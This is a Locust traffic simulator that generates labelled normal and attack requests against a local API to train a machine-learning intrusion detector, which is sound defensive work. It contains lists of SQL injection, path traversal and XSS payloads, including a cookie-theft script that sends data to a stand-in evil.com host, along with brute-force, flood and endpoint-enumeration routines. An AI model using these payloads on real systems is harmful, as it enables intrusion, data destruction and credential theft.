"""
MicroAPI Guard - Traffic Simulator (Locust)
============================================
Generates labeled API traffic for ML training dataset.

Two user classes:
  1. NormalUser  (weight=5, 83%) - Legitimate browsing/ordering behavior
  2. AttackerUser (weight=1, 17%) - SQL injection, path traversal, DDoS, etc.

Expected dataset ratio: ~70% Normal, ~30% Attack
(attackers have shorter wait times so they produce proportionally more requests)

Each request sends an X-Ground-Truth header so the gateway logs
the label ("normal" or "attack") into the JSONL dataset.

Usage:
  locust -f locustfile.py --host http://localhost:5000 --headless \
         -u 50 -r 5 --run-time 10m
"""

import random
import string
import json
from locust import HttpUser, task, between, tag


# ======================== HELPER FUNCTIONS ========================

def random_string(length: int = 10) -> str:
    """Generate a random alphanumeric string."""
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))


def random_email() -> str:
    """Generate a realistic random email."""
    domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
    return f"{random_string(8)}@{random.choice(domains)}"


# SQL injection payloads (common real-world patterns)
SQL_PAYLOADS = [
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "' UNION SELECT username, password FROM users --",
    "1; UPDATE users SET password='hacked' WHERE username='admin'",
    "admin'--",
    "' OR 1=1 #",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "'; EXEC xp_cmdshell('whoami'); --",
    "' UNION ALL SELECT NULL,NULL,NULL --",
    "1 OR SLEEP(5) --",
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..;/..;/..;/etc/passwd",
    "....\\....\\....\\boot.ini",
    "/proc/self/environ",
    "..%00/..%00/etc/passwd",
    "/etc/hosts",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert('XSS')>",
    "\"><script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "<iframe src='javascript:alert(1)'>",
    "'-alert(1)-'",
    "<body onload=alert('XSS')>",
]


def generate_large_payload(size_kb: int = 100) -> str:
    """Generate a large random string payload (default 100KB)."""
    return random_string(size_kb * 1024)


# ======================== NORMAL USER ========================

class NormalUser(HttpUser):
    """
    Simulates a legitimate user browsing products, logging in,
    placing orders, and viewing profiles.

    Behavior:
    - Wait 1-3 seconds between requests (human-like)
    - Uses valid credentials and realistic data
    - Hits standard API endpoints
    - weight=5 means ~83% of spawned users are NormalUser
    """
    weight = 5  # 83% normal users
    wait_time = between(1, 3)

    NORMAL_HEADER = {"X-Ground-Truth": "normal"}

    # Valid credentials from backend's USERS_DB
    VALID_USERS = [
        {"username": "admin", "password": "pass123"},
        {"username": "john", "password": "john456"},
        {"username": "jane", "password": "jane789"},
    ]

    # ---- Browsing Tasks (Most Common) ----

    @task(10)
    @tag("browse")
    def browse_products(self):
        """GET /api/products - Most common action, like browsing a shop."""
        self.client.get("/api/products", headers=self.NORMAL_HEADER)

    @task(8)
    @tag("browse")
    def view_single_product(self):
        """GET /api/products/{id} - View a specific product."""
        product_id = random.randint(1, 5)
        self.client.get(f"/api/products/{product_id}", headers=self.NORMAL_HEADER)

    @task(5)
    @tag("browse")
    def view_profile(self):
        """GET /api/users/profile - Check own profile."""
        self.client.get("/api/users/profile", headers=self.NORMAL_HEADER)

    @task(3)
    @tag("browse")
    def view_orders(self):
        """GET /api/orders - Check order history."""
        self.client.get("/api/orders", headers=self.NORMAL_HEADER)

    @task(2)
    @tag("browse")
    def health_check(self):
        """GET /health - Occasional health check."""
        self.client.get("/health", headers=self.NORMAL_HEADER)

    # ---- Auth Tasks (Less Common) ----

    @task(3)
    @tag("auth")
    def login(self):
        """POST /api/users/login - Login with valid credentials."""
        user = random.choice(self.VALID_USERS)
        self.client.post(
            "/api/users/login",
            json=user,
            headers=self.NORMAL_HEADER,
        )

    @task(1)
    @tag("auth")
    def register_new_user(self):
        """POST /api/users/register - Register a new account."""
        username = f"user_{random_string(6)}"
        self.client.post(
            "/api/users/register",
            json={
                "username": username,
                "password": f"pass_{random_string(8)}",
                "name": f"Test {username.capitalize()}",
                "email": random_email(),
            },
            headers=self.NORMAL_HEADER,
        )

    # ---- Order Tasks (Least Common) ----

    @task(2)
    @tag("order")
    def place_order(self):
        """POST /api/orders - Place a small order."""
        self.client.post(
            "/api/orders",
            json={
                "product_id": random.randint(1, 5),
                "quantity": random.randint(1, 3),
            },
            headers=self.NORMAL_HEADER,
        )


# ======================== ATTACKER USER ========================

class AttackerUser(HttpUser):
    """
    Simulates various attack patterns targeting the API gateway.

    Attack types:
    1. SQL Injection       - Malicious SQL in login credentials
    2. Path Traversal      - Try to read server files via URL
    3. Brute Force Login   - Rapid credential guessing
    4. DDoS / Rapid Fire   - Fast burst requests to overwhelm
    5. Large Payload       - Oversized request bodies
    6. XSS Injection       - Cross-site scripting payloads
    7. Enumeration         - Scanning for hidden endpoints

    Behavior:
    - Wait 0.5-2 seconds between requests (fast but not unrealistic)
    - Uses invalid credentials and malicious payloads
    - weight=1 means ~17% of spawned users are AttackerUser
    """
    weight = 1  # 17% of total users are attackers
    wait_time = between(0.5, 2)

    ATTACK_HEADER = {"X-Ground-Truth": "attack"}

    # ---- SQL Injection ----

    @task(8)
    @tag("sqli")
    def sql_injection_login(self):
        """POST /api/users/login with SQL injection payload."""
        payload = random.choice(SQL_PAYLOADS)
        self.client.post(
            "/api/users/login",
            json={"username": payload, "password": payload},
            headers=self.ATTACK_HEADER,
        )

    @task(5)
    @tag("sqli")
    def sql_injection_search(self):
        """GET /api/products with SQL in query string."""
        payload = random.choice(SQL_PAYLOADS)
        self.client.get(
            f"/api/products?search={payload}",
            headers=self.ATTACK_HEADER,
        )

    # ---- Path Traversal ----

    @task(6)
    @tag("traversal")
    def path_traversal(self):
        """GET with path traversal payload in URL."""
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        self.client.get(
            f"/{payload}",
            headers=self.ATTACK_HEADER,
            name="/[path_traversal]",
        )

    @task(4)
    @tag("traversal")
    def path_traversal_api(self):
        """GET /api/products/../../etc/passwd."""
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        self.client.get(
            f"/api/products/{payload}",
            headers=self.ATTACK_HEADER,
            name="/api/products/[traversal]",
        )

    # ---- Brute Force Login ----

    @task(7)
    @tag("bruteforce")
    def brute_force_login(self):
        """POST /api/users/login with random wrong credentials."""
        self.client.post(
            "/api/users/login",
            json={
                "username": random.choice(["admin", "root", "test", "user"]),
                "password": random_string(8),
            },
            headers=self.ATTACK_HEADER,
        )

    # ---- DDoS / Rapid Fire ----

    @task(5)
    @tag("ddos")
    def rapid_fire_get(self):
        """GET /api/products rapidly to simulate DDoS burst."""
        for _ in range(3):
            self.client.get("/api/products", headers=self.ATTACK_HEADER)

    @task(3)
    @tag("ddos")
    def rapid_fire_mixed(self):
        """Mixed rapid requests to various endpoints."""
        endpoints = ["/api/products", "/api/orders", "/api/users/profile", "/health"]
        for _ in range(2):
            self.client.get(
                random.choice(endpoints),
                headers=self.ATTACK_HEADER,
            )

    # ---- Large Payload ----

    @task(4)
    @tag("payload")
    def large_payload_post(self):
        """POST with abnormally large body (50-200 KB)."""
        size = random.randint(50, 200)
        self.client.post(
            "/api/products",
            json={
                "name": generate_large_payload(size),
                "price": 9999.99,
                "category": "attack",
                "stock": 0,
            },
            headers=self.ATTACK_HEADER,
            name="/api/products [large_payload]",
        )

    @task(3)
    @tag("payload")
    def large_payload_order(self):
        """POST /api/orders with garbage data."""
        self.client.post(
            "/api/orders",
            json={
                "product_id": random.randint(9999, 99999),
                "quantity": random.randint(10000, 99999),
            },
            headers=self.ATTACK_HEADER,
        )

    # ---- XSS Injection ----

    @task(5)
    @tag("xss")
    def xss_register(self):
        """POST /api/users/register with XSS in fields."""
        payload = random.choice(XSS_PAYLOADS)
        self.client.post(
            "/api/users/register",
            json={
                "username": payload,
                "password": "password123",
                "name": payload,
                "email": f"{random_string(5)}@evil.com",
            },
            headers=self.ATTACK_HEADER,
        )

    @task(3)
    @tag("xss")
    def xss_product(self):
        """POST /api/products with XSS in name."""
        payload = random.choice(XSS_PAYLOADS)
        self.client.post(
            "/api/products",
            json={
                "name": payload,
                "price": 1.0,
                "category": payload,
                "stock": 1,
            },
            headers=self.ATTACK_HEADER,
        )

    # ---- Endpoint Enumeration ----

    @task(3)
    @tag("enum")
    def enumerate_endpoints(self):
        """GET random suspicious paths (scanning for hidden APIs)."""
        suspicious_paths = [
            "/admin", "/admin/login", "/api/v2/debug",
            "/.env", "/config.json", "/api/internal/debug",
            "/graphql", "/api/swagger.json", "/actuator/health",
            "/wp-admin", "/phpmyadmin", "/.git/config",
            "/api/admin/users", "/debug/vars", "/server-status",
        ]
        path = random.choice(suspicious_paths)
        self.client.get(
            path,
            headers=self.ATTACK_HEADER,
            name="/[enumeration]",
        )
